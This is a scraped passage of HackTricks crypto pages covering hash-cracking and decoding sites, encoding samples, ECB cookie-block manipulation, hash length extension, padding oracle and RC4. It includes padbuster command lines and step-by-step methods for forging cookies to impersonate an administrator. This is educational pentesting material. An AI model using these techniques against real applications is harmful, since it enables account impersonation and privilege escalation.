it\n‚Äã\nhttp://hashtoolkit.com/reverse-hash?hash=4d186321c1a7f0f354b297e8914ab240\n‚Äã\n‚Äã\nhttps://www.onlinehashcrack.com/\n‚Äã\n‚Äã\nhttps://crackstation.net/\n‚Äã\n‚Äã\nhttps://md5decrypt.net/\n‚Äã\n‚Äã\nhttps://www.onlinehashcrack.com\n‚Äã\n‚Äã\nhttps://gpuhash.me/\n‚Äã\n‚Äã\nhttps://hashes.org/search.php\n‚Äã\n‚Äã\nhttps://www.cmd5.org/\n‚Äã\n‚Äã\nhttps://hashkiller.co.uk/Cracker/MD5\n‚Äã\n‚Äã\nhttps://www.md5online.org/md5-decrypt.html\n‚Äã\nMagic Autosolvers\n‚Äã\nhttps://github.com/Ciphey/Ciphey\n‚Äã\n‚Äã\nhttps://gchq.github.io/CyberChef/\n(Magic module)\n‚Äã\nhttps://github.com/dhondta/python-codext\n‚Äã\n‚Äã\nhttps://www.boxentriq.com/code-breaking\n‚Äã\nEncoders\nMost of encoded data can be decoded with these 2 ressources:\n‚Äã\nhttps://www.dcode.fr/tools-list\n‚Äã\n‚Äã\nhttps://gchq.github.io/CyberChef/\n‚Äã\nSubstitution Autosolvers\n‚Äã\nhttps://www.boxentriq.com/code-breaking/cryptogram\n‚Äã\n‚Äã\nhttps://quipqiup.com/\n- Very good !\nCaesar - ROTx Autosolvers\n‚Äã\nhttps://www.nayuki.io/page/automatic-caesar-cipher-breaker-javascript\n‚Äã\nAtbash Cipher\n‚Äã\nhttp://rumkin.com/tools/cipher/atbash.php\n‚Äã\nBase Encodings Autosolver\nCheck all these bases with:\nhttps://github.com/dhondta/python-codext\n‚Äã\nAscii85\nBQ%]q@psCd@rH0l\nBase26\n[\nA-Z\n]\nBQEKGAHRJKHQMVZGKUXNT\nBase32\n[\nA-Z2-7=\n]\nNBXWYYLDMFZGCY3PNRQQ====\nZbase32\n[\nybndrfg8ejkmcpqxot1uwisza345h769\n]\npbzsaamdcf3gna5xptoo====\nBase32 Geohash\n[\n0-9b-hjkmnp-z\n]\ne1rqssc3d5t62svgejhh====\nBase32 Crockford\n[\n0-9A-HJKMNP-TV-Z\n]\nD1QPRRB3C5S62RVFDHGG====\nBase32 Extended Hexadecimal\n[\n0-9A-V\n]\nD1NMOOB3C5P62ORFDHGG====\nBase45\n[\n0-9A-Z $%*+-./:\n]\n59DPVDGPCVKEUPCPVD\nBase58 (bitcoin)\n[\n1-9A-HJ-NP-Za-km-z\n]\n2yJiRg5BF9gmsU6AC\nBase58 (flickr)\n[\n1-9a-km-zA-HJ-NP-Z\n]\n2YiHqF5bf9FLSt6ac\nBase58 (ripple)\n[\nrpshnaf39wBUDNEGHJKLM4PQ-T7V-Z2b-eCg65jkm8oFqi1tuvAxyz\n]\npyJ5RgnBE9gm17awU\nBase62\n[\n0-9A-Za-z\n]\ng2AextRZpBKRBzQ9\nBase64\n[\nA-Za-z0-9+/=\n]\naG9sYWNhcmFjb2xh\nBase67\n[\nA-Za-z0-9-\n.!~_]\nNI9JKX0cSUdqhr!p\nBase85 (Ascii85)\n[\n!\"#$%&'()*+,-./0-9:;<=>?@A-Z[\\]^_`a-u\n]\nBQ%]q@psCd@rH0l\nBase85 (Adobe)\n[\n!\"#$%&'()*+,-./0-9:;<=>?@A-Z[\\]^_`a-u\n]\n<~BQ%]q@psCd@rH0l~>\nBase85 (IPv6 or RFC1924)\n[\n0-9A-Za-z!#$%&()*+-;<=>?@^\n`{|}~_]\nXm4y\nV_|Y(V{dF>`\nBase85 (xbtoa)\n[\n!\"#$%&'()*+,-./0-9:;<=>?@A-Z[\\]^_`a-u\n]\nxbtoa Begin\\nBQ%]q@psCd@rH0l\\nxbtoa End N 12 c E 1a S 4e6 R 6991d\nBase85 (XML)\n[\n0-9A-Za-y!#$()*+,-./:;=?@^`{|}~z_\n]\nXm4y|V{~Y+V}dF?\nBase91\n[\nA-Za-z0-9!#$%&()*+,./:;<=>?@[]^_`{|}~\"\n]\nfrDg[*jNN!7&BQM\nBase100\n[]\nüëüüë¶üë£üëòüëöüëòüë©üëòüëöüë¶üë£üëò\nBase122\n[]\n4F ÀÇr0Xmvc\nATOM-128\n[\n/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC\n]\nMIc3KiXa+Ihz+lrXMIc3KbCC\nHAZZ15\n[\nHNO4klm6ij9n+J2hyf0gzA8uvwDEq3X1Q7ZKeFrWcVTts/MRGYbdxSo=ILaUpPBC5\n]\nDmPsv8J7qrlKEoY7\nMEGAN35\n[\n3G-Ub=c-pW-Z/12+406-9Vaq-zA-F5\n]\nkLD8iwKsigSalLJ5\nZONG22\n[\nZKj9n+yf0wDVX1s/5YbdxSo=ILaUpPBCHg8uvNO4klm6iJGhQ7eFrWczAMEq3RTt2\n]\nayRiIo1gpO+uUc7g\nESAB46\n[]\n3sHcL2NR8WrT7mhR\nMEGAN45\n[]\nkLD8igSXm2KZlwrX\nTIGO3FX\n[]\n7AP9mIzdmltYmIP9mWXX\nTRIPO5\n[]\nUE9vSbnBW6psVzxB\nFERON74\n[]\nPbGkNudxCzaKBm0x\nGILA7\n[]\nD+nkv8C1qIKMErY1\nCitrix CTX1\n[]\nMNGIKCAHMOGLKPAKMMGJKNAINPHKLOBLNNHILCBHNOHLLPBK\n‚Äã\nhttp://k4.cba.pl/dw/crypo/tools/eng_atom128c.html\n- 404 Dead:\nhttps://web.archive.org/web/20190228181208/http://k4.cba.pl/dw/crypo/tools/eng_hackerize.html\n‚Äã\nHackerizeXS [\n‚ï´Œõ‚Üª‚îú‚ò∞‚îè\n]\n‚ï´‚òê‚ÜëŒõ‚ÜªŒõ‚îèŒõ‚Üª‚òê‚ÜëŒõ\n‚Äã\nhttp://k4.cba.pl/dw/crypo/tools/eng_hackerize.html\n- 404 Dead:\nhttps://web.archive.org/web/20190228181208/http://k4.cba.pl/dw/crypo/tools/eng_hackerize.html\n‚Äã\nMorse\n.... --- .-.. -.-. .- .-. .- -.-. --- .-.. .-\n‚Äã\nhttp://k4.cba.pl/dw/crypo/tools/eng_morse-encode.html\n- 404 Dead:\nhttps://gchq.github.io/CyberChef/\n‚Äã\nUUencoder\nbegin 644 webutils_pl\nM2$],04A/3$%(3TQ!2$],04A/3$%(3TQ!2$],04A/3$%(3TQ!2$],04A/3$%(\nM3TQ!2$],04A/3$%(3TQ!2$],04A/3$%(3TQ!2$],04A/3$%(3TQ!2$],04A/\nF3$%(3TQ!2$],04A/3$%(3TQ!2$],04A/3$%(3TQ!2$],04A/3$$`\n`\nend\n‚Äã\nhttp://www.webutils.pl/index.php?idx=uu\n‚Äã\nXXEncoder\nbegin 644 webutils_pl\nhG2xAEIVDH236Hol-G2xAEIVDH236Hol-G2xAEIVDH236Hol-G2xAEIVDH236\n5Hol-G2xAEE++\nend\n‚Äã\nwww.webutils.pl/index.php?idx=xx\n‚Äã\nYEncoder\n=ybegin line=128 size=28 name=webutils_pl\nryvkryvkryvkryvkryvkryvkryvk\n=yend size=28 crc32=35834c86\n‚Äã\nhttp://www.webutils.pl/index.php?idx=yenc\n‚Äã\nBinHex\n(This file must be converted with BinHex 4.0)\n:#hGPBR9dD@acAh\"X!$mr2cmr2cmr!!!!!!!8!!!!!-ka5%p-38K26%&)6da\"5%p\n-38K26%'d9J!!:\n‚Äã\nhttp://www.webutils.pl/index.php?idx=binhex\n‚Äã\nASCII85\n<~85DoF85DoF85DoF85DoF85DoF85DoF~>\n‚Äã\nhttp://www.webutils.pl/index.php?idx=ascii85\n‚Äã\nDvorak keyboard\ndrnajapajrna\n‚Äã\nhttps://www.geocachingtoolbox.com/index.php?lang=en&page=dvorakKeyboard\n‚Äã\nA1Z26\nLetters to their numerical value\n8 15 12 1 3 1 18 1 3 15 12 1\nAffine Cipher Encode\nLetter to num\n(ax+b)%26\n(\na\nand\nb\nare the keys and\nx\nis the letter) and the result back to letter\nkrodfdudfrod\nSMS Code\nMultitap\nreplaces a letter\nby repeated digits defined by the corresponding key code on a mobile\nphone keypad\n(This mode is used when writing SMS).\nFor example: 2=A, 22=B, 222=C, 3=D...\nYou can identify this code because you will see** several numbers repeated**.\nYou can decode this code in:\nhttps://www.dcode.fr/multitap-abc-cipher\n‚Äã\nBacon Code\nSubstitude each letter for 4 As or Bs (or 1s and 0s)\n00111 01101 01010 00000 00010 00000 10000 00000 00010 01101 01010 00000\nAABBB ABBAB ABABA AAAAA AAABA AAAAA BAAAA AAAAA AAABA ABBAB ABABA AAAAA\nRunes\nCompression\nRaw Deflate\nand\nRaw Inflate\n(you can find both in Cyberchef) can compress and decompress data without headers.\nEasy Crypto\nXOR - Autosolver\n‚Äã\nhttps://wiremask.eu/tools/xor-cracker/\n‚Äã\nBifid\nA keywork is needed\nfgaargaamnlunesuneoa\nVigenere\nA keywork is needed\nwodsyoidrods\n‚Äã\nhttps://www.guballa.de/vigenere-solver\n‚Äã\n‚Äã\nhttps://www.dcode.fr/vigenere-cipher\n‚Äã\n‚Äã\nhttps://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx\n‚Äã\nStrong Crypto\nFernet\n2 base64 strings (token and key)\nToken:\ngAAAAABWC9P7-9RsxTz_dwxh9-O2VUB7Ih8UCQL1_Zk4suxnkCvb26Ie4i8HSUJ4caHZuiNtjLl3qfmCv_fS3_VpjL7HxCz7_Q==\n‚Äã\nKey:\n-s6eI5hyNh8liH7Gq0urPC-vzPgNnxauKvRO4g03oYI=\n‚Äã\nhttps://asecuritysite.com/encryption/ferdecode\n‚Äã\nSamir Secret Sharing\nA secret is splitted in X parts and to recover it you need Y parts (\nY <=X\n).\n8019f8fa5879aa3e07858d08308dc1a8b45\n80223035713295bddf0b0bd1b10a5340b89\n803bc8cf294b3f83d88e86d9818792e80cd\n‚Äã\nhttp://christian.gen.co/secrets/\n‚Äã\nOpenSSL brute-force\n‚Äã\nhttps://github.com/glv2/bruteforce-salted-openssl\n‚Äã\n‚Äã\nhttps://github.com/carlospolop/easy_BFopensslCTF\n‚Äã\nTools\n‚Äã\nhttps://github.com/Ganapati/RsaCtfTool\n‚Äã\n‚Äã\nhttps://github.com/lockedbyte/cryptovenom\n‚Äã\n‚Äã\nhttps://github.com/nccgroup/featherduster\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nCipher Block Chaining CBC-MAC\nNext\n- Crypto & Stego\nElectronic Code Book (ECB)\nLast modified\n6mo ago"
    },
    {
        "title": "Electronic Code Book (ECB)",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/electronic-code-book-ecb",
        "text": "Electronic Code Book (ECB)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nECB\n(ECB) Electronic Code Book - symmetric encryption scheme which\nreplaces each block of the clear text\nby the\nblock of ciphertext\n. It is the\nsimplest\nencryption scheme. The main idea is to\nsplit\nthe clear text into\nblocks of N bits\n(depends on the size of the block of input data, encryption algorithm) and then to encrypt (decrypt) each block of clear text using the only key.\nUsing ECB has multiple security implications:\nBlocks from encrypted message can be removed\nBlocks from encrypted message can be moved around\nDetection of the vulnerability\nImagine you login into an application several times and you\nalways get the same cookie\n. This is because the cookie of the application is\n<username>|<password>\n.\nThen, you generate to new users, both of them with the\nsame long password\nand\nalmost\nthe\nsame\nusername\n.\nYou find out that the\nblocks of 8B\nwhere the\ninfo of both users\nis the same are\nequals\n. Then, you imagine that this might be because\nECB is being used\n.\nLike in the following example. Observe how these** 2 decoded cookies** has several times the block\n\\x23U\\xE45K\\xCB\\x21\\xC8\n\\x23U\\xE45K\\xCB\\x21\\xC8\\x23U\\xE45K\\xCB\\x21\\xC8\\x04\\xB6\\xE1H\\xD1\\x1E \\xB6\\x23U\\xE45K\\xCB\\x21\\xC8\\x23U\\xE45K\\xCB\\x21\\xC8+=\\xD4F\\xF7\\x99\\xD9\\xA9\n‚Äã\n\\x23U\\xE45K\\xCB\\x21\\xC8\\x23U\\xE45K\\xCB\\x21\\xC8\\x04\\xB6\\xE1H\\xD1\\x1E \\xB6\\x23U\\xE45K\\xCB\\x21\\xC8\\x23U\\xE45K\\xCB\\x21\\xC8+=\\xD4F\\xF7\\x99\\xD9\\xA9\nThis is because the\nusername and password of those cookies contained several times the letter \"a\"\n(for example). The\nblocks\nthat are\ndifferent\nare blocks that contained\nat least 1 different character\n(maybe the delimiter \"|\" or some necessary difference in the username).\nNow, the attacker just need to discover if the format is\n<username><delimiter><password>\nor\n<password><delimiter><username>\n. For doing that, he can just\ngenerate several usernames with similar and long usernames and passwords until he find the format and the length of the delimiter:\nUsername length:\nPassword length:\nUsername+Password length:\nCookie's length (after decoding):\n2\n2\n4\n8\n3\n3\n6\n8\n3\n4\n7\n8\n4\n4\n8\n16\n7\n7\n14\n16\nExploitation of the vulnerability\nRemoving entire blocks\nKnowing the format of the cookie (\n<username>|<password>\n), in order to impersonate the username\nadmin\ncreate a new user called\naaaaaaaaadmin\nand get the cookie and decode it:\n\\x23U\\xE45K\\xCB\\x21\\xC8\\xE0Vd8oE\\x123\\aO\\x43T\\x32\\xD5U\\xD4\nWe can see the pattern\n\\x23U\\xE45K\\xCB\\x21\\xC8\ncreated previously with the username that contained only\na\n.\nThen, you can remove the first block of 8B and you will et a valid cookie for the username\nadmin\n:\n\\xE0Vd8oE\\x123\\aO\\x43T\\x32\\xD5U\\xD4\nMoving blocks\nIn many databases it is the same to search for\nWHERE username='admin';\nor for\nWHERE username='admin ';\n(Note the extra spaces)\nSo, another way to impersonate the user\nadmin\nwould be to:\nGenerate a username that:\nlen(<username>) + len(<delimiter) % len(block)\n. With a block size of\n8B\nyou can generate username called:\nusername\n, with the delimiter\n|\nthe chunk\n<username><delimiter>\nwill generate 2 blocks of 8Bs.\nThen, generate a password that will fill an exact number of blocks containing the username we want to impersonate and spaces, like:\nadmin\nThe cookie of this user is going to be composed by 3 blocks: the first 2 is the blocks of the username + delimiter and the third one of the password (which is faking the username):\nusername |admin\n** Then, just replace the first block with the last time and will be impersonating the user\nadmin\n:\nadmin |username\n**\nReferences\n‚Äã\nhttp://cryptowiki.net/index.php?title=Electronic_Code_Book_(ECB)\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nCrypto CTFs Tricks\nNext\n- Crypto & Stego\nHash Length Extension Attack\nLast modified\n6mo ago"
    },
    {
        "title": "Hash Length Extension Attack",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack",
        "text": "Hash Length Extension Attack\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nSummary of the attack\nImagine a server which is\nsigning\nsome\ndata\nby\nappending\na\nsecret\nto some known clear text data and then hashing that data. If you know:\nThe length of the secret\n(this can be also bruteforced from a given length range)\nThe clear text data\nThe algorithm (and it's vulnerable to this attack)\nThe padding is known\nUsually a default one is used, so if the other 3 requirements are met, this also is\nThe padding vary depending on the length of the secret+data, that's why the length of the secret is needed\nThen, it's possible for an\nattacker\nto\nappend\ndata\nand\ngenerate\na valid\nsignature\nfor the\nprevios data + appended data\n.\nHow?\nBasically the vulnerable algorithms generate the hashes by firstly\nhashing a block of data\n, and then,\nfrom\nthe\npreviously\ncreated\nhash\n(state), they\nadd the next block of data\nand\nhash it\n.\nThen, imagine that the secret is \"secret\" and the data is \"data\", the MD5 of \"secretdata\" is 6036708eba0d11f6ef52ad44e8b74d5b.\nIf an attacker wants to append the string \"append\" he can:\nGenerate a MD5 of 64 \"A\"s\nChange the state of the previously initialized hash to 6036708eba0d11f6ef52ad44e8b74d5b\nAppend the string \"append\"\nFinish the hash and the resulting hash will be a\nvalid one for \"secret\" + \"data\" + \"padding\" + \"append\"\nTool\nGitHub - iagox86/hash_extender\nGitHub\nReferences\nYou can find this attack good explained in\nhttps://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nElectronic Code Book (ECB)\nNext\n- Crypto & Stego\nPadding Oracle\nLast modified\n6mo ago"
    },
    {
        "title": "Padding Oracle",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv",
        "text": "Padding Oracle\n‚Äã\n\u0000‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCBC - Cipher Block Chaining\nIn CBC mode the\nprevious encrypted block is used as IV\nto XOR with the next block:\nCBC encryption\nTo decrypt CBC the\nopposite\noperations\nare done:\nCBC decryption\nNotice how it's needed to use an\nencryption\nkey\nand an\nIV\n.\nMessage Padding\nAs the encryption is performed in\nfixed\nsize\nblocks\n,\npadding\nis usually needed in the\nlast\nblock\nto complete its length.\nUsually\nPKCS7\nis used, which generates a padding\nrepeating\nthe\nnumber\nof\nbytes\nneeded\nto\ncomplete\nthe block. For example, if the last block is missing 3 bytes, the padding will be\n\\x03\\x03\\x03\n.\nLet's look at more examples with a\n2 blocks of length 8bytes\n:\nbyte #0\nbyte #1\nbyte #2\nbyte #3\nbyte #4\nbyte #5\nbyte #6\nbyte #7\nbyte #0\nbyte #1\nbyte #2\nbyte #3\nbyte #4\nbyte #5\nbyte #6\nbyte #7\nP\nA\nS\nS\nW\nO\nR\nD\n1\n2\n3\n4\n5\n6\n0x02\n0x02\nP\nA\nS\nS\nW\nO\nR\nD\n1\n2\n3\n4\n5\n0x03\n0x03\n0x03\nP\nA\nS\nS\nW\nO\nR\nD\n1\n2\n3\n0x05\n0x05\n0x05\n0x05\n0x05\nP\nA\nS\nS\nW\nO\nR\nD\n0x08\n0x08\n0x08\n0x08\n0x08\n0x08\n0x08\n0x08\nNote how in the last example the\nlast block was full so another one was generated only with padding\n.\nPadding Oracle\nWhen an application decrypts encrypted data, it will first decrypt the data; then it will remove the padding. During the cleanup of the padding, if an\ninvalid padding triggers a detectable behaviour\n, you have a\npadding oracle vulnerability\n. The detectable behaviour can be an\nerror\n, a\nlack of results\n, or a\nslower response\n.\nIf you detect this behaviour, you can\ndecrypt the encrypted data\nand even\nencrypt any cleartext\n.\nHow to exploit\nYou could use\nhttps://github.com/AonCyberLabs/PadBuster\nto exploit this kind of vulnerability or just do\nsudo apt-get install padbuster\nIn order to test if the cookie of a site is vulnerable you could try:\nperl ./padBuster.pl http://10.10.10.10/index.php\n\"RVJDQrwUdTRWJUVUeBKkEA==\"\n8\n-encoding\n0\n-cookies\n\"login=RVJDQrwUdTRWJUVUeBKkEA==\"\nEncoding 0\nmeans that\nbase64\nis used (but others are available, check the help menu).\nYou could also\nabuse this vulnerability to encrypt new data. For example, imagine that the content of the cookie is \"\nuser=MyUsername\n\", then you may change it to \"_user=administrator_\" and escalate privileges inside the application. You could also do it using\npaduster\nspecifying the -plaintext\nparameter:\nperl ./padBuster.pl http://10.10.10.10/index.php\n\"RVJDQrwUdTRWJUVUeBKkEA==\"\n8\n-encoding\n0\n-cookies\n\"login=RVJDQrwUdTRWJUVUeBKkEA==\"\n-plaintext\n\"user=administrator\"\nIf the site is vulnerable\npadbuster\nwill automatically try to find when the padding error occurs, but you can also indicating the error message it using the\n-error\nparameter.\nperl ./padBuster.pl http://10.10.10.10/index.php\n\"\"\n8\n-encoding\n0\n-cookies\n\"hcon=RVJDQrwUdTRWJUVUeBKkEA==\"\n-error\n\"Invalid padding\"\nThe theory\nIn\nsummary\n, you can start decrypting the encrypted data by guessing the correct values that can be used to create all the\ndifferent paddings\n. Then, the padding oracle attack will start decrypting bytes from the end to the start by guessing which will be the correct value that\ncreates a padding of 1, 2, 3, etc\n.\nImagine you have some encrypted text that occupies\n2 blocks\nformed by the bytes from\nE0 to E15\n.\nIn order to\ndecrypt\nthe\nlast\nblock\n(\nE8\nto\nE15\n), the whole block passes through the \"block cipher decryption\" generating the\nintermediary bytes I0 to I15\n.\nFinally, each intermediary byte is\nXORed\nwith the previous encrypted bytes (E0 to E7). So:\nC15 = D(E15) ^ E7 = I15 ^ E7\nC14 = I14 ^ E6\nC13 = I13 ^ E5\nC12 = I12 ^ E4\n...\nNow, It's possible to\nmodify\nE7\nuntil\nC15\nis\n0x01\n, which will also be a correct padding. So, in this case:\n\\x01 = I15 ^ E'7\nSo, finding E'7, it's\npossible to calculate I15\n:\nI15 = 0x01 ^ E'7\nWhich allow us to\ncalculate C15\n:\nC15 = E7 ^ I15 = E7 ^ \\x01 ^ E'7\nKnowing\nC15\n, now it's possible to\ncalculate C14\n, but this time brute-forcing the padding\n\\x02\\x02\n.\nThis BF is as complex as the previous one as it's possible to calculate the the\nE''15\nwhose value is 0x02:\nE''7 = \\x02 ^ I15\nso it's just needed to find the\nE'14\nthat generates a\nC14\nequals to\n0x02\n.\nThen, do the same steps to decrypt C14:\nC14 = E6 ^ I14 = E6 ^ \\x02 ^ E''6\nFollow this chain until you decrypt the whole encrypted text.\nDetection of the vulnerability\nRegister and account and log in with this account .\nIf you\nlog in many times\nand always get the\nsame cookie\n, there is probably\nsomething\nwrong\nin the application. The\ncookie sent back should be unique\neach time you log in. If the cookie is\nalways\nthe\nsame\n, it will probably always be valid and there\nwon't be anyway to invalidate i\nt.\nNow, if you try to\nmodify\nthe\ncookie\n, you can see that you get an\nerror\nfrom the application.\nBut if you BF the padding (using padbuster for example) you manage to get another cookie valid for a different user. This scenario is highly probably vulnerable to padbuster.\nReferences\n‚Äã\nhttps://en.wikipedia.org/wiki/Block_cipher_mode_of_operation\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nHash Length Extension Attack\nNext\n- Crypto & Stego\nRC4 - Encrypt&Decrypt\nLast modified\n6mo ago"
    },
    {
        "title": "RC4 - Encrypt&Decrypt",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/rc4-encrypt-and-decrypt",
        "text": "RC4 - Encrypt&Decrypt\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIf you can somehow encrypt a plaintext using a RC4**,** you can decrypt any content encrypted by that RC4(using the same password) just using the encryption function.\nIf you can encrypt a known plaintext you can also extract the password. More references can be found in the HTB Kryptos machine:\nHack The Box - Kryptos\n0xRick's Blog\nHack The Box - Kryptos\n0xRick's Blog\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nPadding Oracle\nNext\n- Crypto & Stego\nStego Tricks\nLast modified\n6mo ago"
    },
    {
        "title": "Stego Tricks",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/stego-tricks",
